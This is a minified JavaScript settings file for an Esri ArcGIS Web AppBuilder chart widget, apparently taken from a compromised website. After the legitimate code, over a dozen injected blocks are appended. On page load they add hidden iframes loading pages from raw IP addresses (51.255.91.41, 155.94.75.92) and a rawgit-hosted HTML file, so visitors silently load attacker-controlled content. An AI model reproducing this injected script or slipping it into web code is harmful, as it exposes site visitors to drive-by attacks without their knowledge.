// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/RelatedTableCharts/setting/GeneralSetting.html":'\x3cdiv\x3e\r\n    \x3cdiv class\x3d"esriCTmainContainer"\x3e\r\n        \x3cfieldset class\x3d"esriCTGeneralSettingFieldset"\x3e\r\n            \x3clegend class\x3d"esriCTGeneralSettingLegend" title\x3d"${nls.legendGeneralSettingText}"\x3e\r\n                ${nls.legendGeneralSettingText} \x3c/legend\x3e\r\n            \x3c!-- All components of general setting --\x3e\r\n            \x3cdiv class\x3d"esriCTGeneralSettingComponentsDiv"\x3e\r\n                \x3c!-- This part of html contains Label, Hint and icon for Graphic Location Symbol --\x3e\r\n                \x3cdiv class\x3d"esriCTGraphicLocationSymbolMainDiv"\x3e\r\n                    \x3cdiv class\x3d"esriCTLocationSymbolLabelMainDiv"\x3e\r\n                        \x3cdiv class\x3d"esriCTLocationSymbolLabel esriCTGeneralSettingLabel"\x3e\r\n                            ${nls.locationSymbolLabel}\r\n                        \x3c/div\x3e\r\n                        \x3cdiv class\x3d"esriCTLocationSymbolHint esriCTHint"\x3e\r\n                            ${nls.locationSymbolHintText}\r\n                        \x3c/div\x3e\r\n                    \x3c/div\x3e\r\n                    \x3c!-- End of esriCTLocationSymbolLabelMainDiv --\x3e\r\n                    \x3cdiv class\x3d"esriCTLocationSymbolIconDiv"\x3e\r\n                        \x3cdiv class\x3d"esriCTLocationSymbolIcon" data-dojo-attach-point\x3d"locationSymbolIconNode"\x3e\r\n                        \x3c/div\x3e\r\n                    \x3c/div\x3e\r\n                    \x3c!-- End of esriCTLocationSymbolIconDiv --\x3e\r\n                \x3c/div\x3e\r\n                \x3c!-- End of esriCTGraphicLocationSymbolMainDiv --\x3e\r\n\r\n                \x3c!-- This part of html contains Label, Hint and textbox for refresh interval --\x3e\r\n                \x3cdiv class\x3d"esriCTRefreshIntervalMainDiv"\x3e\r\n                    \x3cdiv class\x3d"esriCTRefreshIntervalLabelMainDiv"\x3e\r\n                        \x3cdiv class\x3d"esriCTRefreshIntervalLabel esriCTGeneralSettingLabel"\x3e\r\n                            ${nls.refreshIntervalLabel}\r\n                        \x3c/div\x3e\r\n                        \x3cdiv class\x3d"esriCTRefreshIntervalHint esriCTHint"\x3e\r\n                            ${nls.refreshIntervalHintText}\r\n                        \x3c/div\x3e\r\n                    \x3c/div\x3e\r\n                    \x3c!-- End of esriCTRefreshIntervalLabelMainDiv --\x3e\r\n                    \x3cdiv class\x3d"esriCTRefreshIntervalTxtBxDiv"\x3e\r\n                        \x3cinput type\x3d"text" value\x3d"0"  data-dojo-attach-point\x3d"refreshIntervalTxtBx"\r\n                            data-dojo-type\x3d"dijit/form/NumberTextBox" trim\x3d"true" constraints\x3d"{min:0,max:1440}"\r\n                            data-dojo-attach-event\x3d"change:_onRefreshIntervalChanged" /\x3e\r\n                    \x3c/div\x3e\r\n                    \x3c!-- End of esriCTRefreshIntervalTxtBxDiv --\x3e\r\n                \x3c/div\x3e\r\n                \x3c!-- End of esriCTRefreshIntervalMainDiv --\x3e\r\n            \x3c/div\x3e\r\n            \x3c!-- End of general setting components --\x3e\r\n        \x3c/fieldset\x3e\r\n    \x3c/div\x3e\r\n\x3c/div\x3e\r\n'}});
define("jimu/BaseWidgetSetting dojo/_base/declare dojo/_base/lang dojo/on dijit/_WidgetsInTemplateMixin ./SymbolChooserPopup jimu/symbolUtils jimu/utils dojo/text!./GeneralSetting.html esri/symbols/jsonUtils jimu/dijit/Message dojo/dom-construct".split(" "),function(g,h,e,k,l,m,n,p,q,f,r,d){return h([g,l],{baseClass:"jimu-widget-RelatedTableCharts-setting",templateString:q,nls:this.nls,config:this.config,graphicLocatoionSymbolJSON:null,postMixInProperties:function(){this.nls=e.mixin(this.nls,window.jimuNls.common)},
postCreate:function(){this._createSymbolPickerNode();this._setRefreshIntervalTxtBxValue()},_createSymbolPickerNode:function(){var a={},b,c;a.type=p.getSymbolTypeByGeometryType("esriGeometryPoint");this.config&&this.config.symbol&&this.config.symbol.graphicLocationSymbol&&(a.symbol=f.fromJson(this.config.symbol.graphicLocationSymbol));b=this._createPreviewContainer(this.locationSymbolIconNode);c={symbolChooserTitle:this.nls.locationSymbolLabel,symbolParams:a,nls:this.nls};this._showSelectedSymbol(b,
a.symbol);this.own(k(b,"click",e.hitch(this,function(){a.symbol=f.fromJson(this.graphicLocatoionSymbolJSON);this._initSymbolChooserPopup(c,b)})))},_createPreviewContainer:function(a){var b;a=d.create("table",{cellspacing:"0",cellpadding:"0"},a);a=d.create("tr",{style:"height:30px"},a);b=d.create("td",{},a);d.create("div",{innerHTML:this.nls.symbolPickerPreviewText,"class":"esriCTSymbolPreviewText"},b);a=d.create("td",{},a);return d.create("div",{"class":"esriCTSymbolChooserNode"},a)},_initSymbolChooserPopup:function(a,
b){var c=new m(a);c.onOkClick=e.hitch(this,function(){var a=c.symbolChooser.getSymbol();this._showSelectedSymbol(b,a);c.popup.close()})},_showSelectedSymbol:function(a,b){d.empty(a);if(b){var c=n.createSymbolNode(b);c||(c=d.create("div"));d.place(c,a);this.graphicLocatoionSymbolJSON=b.toJson()}},getConfig:function(){var a={symbol:{graphicLocationSymbol:this.graphicLocatoionSymbolJSON},refreshInterval:this.refreshIntervalTxtBx.value};if(this.refreshIntervalTxtBx.isValid())return a;this._errorMessage(this.nls.errMsgRefreshInterval);
return!1},_setRefreshIntervalTxtBxValue:function(){this.config&&this.config.refreshInterval&&this.refreshIntervalTxtBx.set("value",this.config.refreshInterval)},_onRefreshIntervalChanged:function(){isNaN(this.refreshIntervalTxtBx.get("value"))&&this.refreshIntervalTxtBx.set("value",0)},_errorMessage:function(a){(new r({message:a})).message=a}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});